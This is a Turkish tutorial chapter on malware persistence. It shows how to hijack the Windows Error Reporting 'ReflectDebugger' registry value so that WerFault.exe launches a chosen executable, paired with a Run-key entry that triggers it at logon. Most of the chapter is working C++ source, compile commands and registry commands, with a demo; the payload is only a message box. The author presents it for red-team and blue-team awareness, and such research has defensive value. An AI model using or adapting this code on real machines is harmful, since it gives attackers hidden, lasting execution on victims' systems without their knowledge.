\newpage
\subsection{84. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 18. Windows Hata Raporlama. Basit C++ örneği.}

﷽

![pers](./images/78/2022-11-02_05-28.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımların kalıcılığını sağlamak için kullanılan en ilginç yöntemlerden biri üzerine yaptığım araştırmaya dayanmaktadır: `WerFault.exe` aracılığıyla kalıcılık.     

### WerFault.exe

Windows Hata Raporlama sisteminin davranışlarını incelerken ilginç bir Kayıt Defteri yolu keşfettim:     

`HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs`

Eğer `WerFault.exe -pr <değer>` komutunu çalıştırırsak, `HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger=<path_value>` değerinin okunduğunu görebiliriz. Bu komut, `WerFault.exe`'yi *"yansıtıcı hata ayıklayıcı"* (reflective debugger) modunda çalıştırır ve bu oldukça ilginçtir. Örneğin, `WerFault.exe -pr 1` komutunu çalıştırarak Sysinternals Process Monitor ile kontrol edelim:     

![pers](./images/78/2022-11-02_04-48.png){width="80%"}    

![pers](./images/78/2022-11-02_04-49.png){width="80%"}    

Başka bir filtre ekleyelim:    

![pers](./images/78/2022-11-02_04-51.png){width="80%"}    

Sonuç olarak, bu değeri ele geçirmek için bir açık elde ediyoruz:     

![pers](./images/78/2022-11-02_04-52.png){width="80%"}    

Peki, burada numara nedir? `HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger` kayıt defteri değerini kötü amaçlı uygulamamızla değiştirebiliriz çünkü `WerFault.exe` bu değeri yalnızca okumakla kalmaz, aynı zamanda çalıştırır. Ve tabii ki bunu kalıcılık sağlamak için kullanabiliriz.    


### pratik örnek

Basitlik açısından, her zamanki gibi, "kötü" uygulamam sadece bir `meow-meow` mesaj kutusudur (`hack.cpp`):     

```cpp
/*
meow-meow mesaj kutusu
yazar: @cocomelonc
*/
#include <windows.h>

#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR 
lpCmdLine, int nCmdShow) {
  MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Ardından, "kötü" uygulamam ile bir kayıt defteri anahtar değeri oluşturan betiği oluşturuyoruz:    

```cpp
int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // kötü amaçlı uygulama
  const char* exe = "Z:\\2022-11-02-malware-pers-18\\hack.exe";

  // ele geçirilen uygulama
  const char* wf = "WerFault.exe -pr 1";

  // kötü amaçlı uygulamayı ayarla
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0 , 
  KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // yeni bir kayıt defteri anahtarı oluştur
    RegSetValueEx(hkey, (LPCSTR)"ReflectDebugger", 0, REG_SZ, (unsigned char*)
    exe, strlen(exe));
    RegCloseKey(hkey);
  }
}
```

Ayrıca, kalıcılık için [klasik yöntemlerden birini](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html) kullandım:     

```cpp
// başlangıç
res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
  // yeni bir kayıt defteri anahtarı oluştur
  RegSetValueEx(hkey, (LPCSTR)"meow", 0, REG_SZ, (unsigned char*)wf, 
  strlen(wf));
  RegCloseKey(hkey);
}
```

Sonuç olarak, nihai kaynak kodu şu şekilde görünmektedir (`pers.cpp`):    

```cpp
/*
pers.cpp
WerFault.exe ile Windows kalıcılığı
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // kötü amaçlı uygulama
  const char* exe = "Z:\\2022-11-02-malware-pers-18\\hack.exe";

  // ele geçirilen uygulama
  const char* wf = "WerFault.exe -pr 1";

  // kötü amaçlı uygulamayı ayarla
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0 , 
  KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // yeni bir kayıt defteri anahtarı oluştur
    RegSetValueEx(hkey, (LPCSTR)"ReflectDebugger", 0, REG_SZ, 
    (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  // başlangıç
  res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // yeni bir kayıt defteri anahtarı oluştur
    RegSetValueEx(hkey, (LPCSTR)"meow", 0, REG_SZ, (unsigned char*)wf, 
    strlen(wf));
    RegCloseKey(hkey);
  }
  return 0;
}
```

### demo

Haydi her şeyi eyleme dökelim. "Kötü" uygulamamızı derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/78/2022-11-02_04-54.png){width="80%"}    

ve kalıcılık betiğini derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
fdata-sections -Wno-write-strings -fno-exceptions \
fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/78/2022-11-02_04-55.png){width="80%"}    

Her şeyi çalıştırmadan önce, ilk olarak kayıt defteri anahtarını ve değerini kontrol edelim:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger" /s
```

"Kötü amaçlı yazılımı" kontrol amacıyla çalıştıralım:     

```powershell
.\hack.exe
```

![pers](./images/78/2022-11-02_04-56.png){width="80%"}    

Ayrıca, kalıcılık mantığı için kullanılan kayıt defteri anahtarlarını da kontrol edelim:     

```powershell
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](./images/78/2022-11-02_04-58.png){width="80%"}    

Ardından, `pers.exe`'yi çalıştıralım:    

```powershell
.\pers.exe
```

ve Windows Hata Raporlama kayıt defteri anahtarını tekrar kontrol edelim:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /s
```

![pers](./images/78/2022-11-02_05-08.png){width="80%"}    

Gördüğünüz gibi, anahtar değeri düzenlendi ve doğruluğunu kontrol etmek için şu komutu çalıştırabiliriz:    

```powershell
WerFault.exe -pr 1
```

![pers](./images/78/2022-11-02_05-10.png){width="80%"}    

Ardından, oturumu kapatın ve tekrar açın:    

![pers](./images/78/2022-11-02_05-13.png){width="80%"}    

ve birkaç saniye sonra beklenildiği gibi `meow-meow` mesaj kutumuz açılır:    

![pers](./images/78/2022-11-02_05-14.png){width="80%"}    

`hack.exe`'nin özelliklerini Process Hacker 2 ile kontrol edebilirsiniz:     

![pers](./images/78/2022-11-02_05-15.png){width="80%"}    

Ayrıca, Windows Hata Raporlama'yı ele geçirmek için yönetici ayrıcalıkları gerektiğine dikkat edin, ancak kalıcılık için düşük seviyeli ayrıcalıklar kullanıyoruz:     

```powershell
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error 
Reporting\Hangs" -Name "ReflectDebugger"
Remove-ItemProperty -Path 
"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "meow"
```

![pers](./images/78/2022-11-02_05-17.png){width="80%"}    

![pers](./images/78/2022-11-02_05-22.png){width="80%"}    

![pers](./images/78/2022-11-02_05-22_1.png){width="80%"}    

Her şeyi eski haline döndürmeye karar verirseniz, bunu fark edebilirsiniz.    

Gördüğünüz gibi her şey mükemmel çalışıyor! =^..^=

> Bir sonraki konu 17 olmalıydı, ancak jeton hırsızlığının üçüncü bölümü ile birlikte yayımlanacak. 10 dakika boyunca neden çalışmıyor anlamadım :)    

![pers](./images/78/2022-11-02_05-06.png){width="80%"}    

Bu taktiğin vahşi ortamda herhangi bir APT tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu gönderinin mavi takım üyelerinin farkındalığını artırmasını ve kırmızı takım üyelerinin cephaneliğine bir silah eklemesini umuyorum.    

[MSDN Windows Error Reporting](https://learn.microsoft.com/en-us/windows/win32/wer/windows-error-reporting)       
[DLL hijacking](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)     
[DLL hijacking with exported functions](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html)     
[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-11-02-malware-pers-18)     
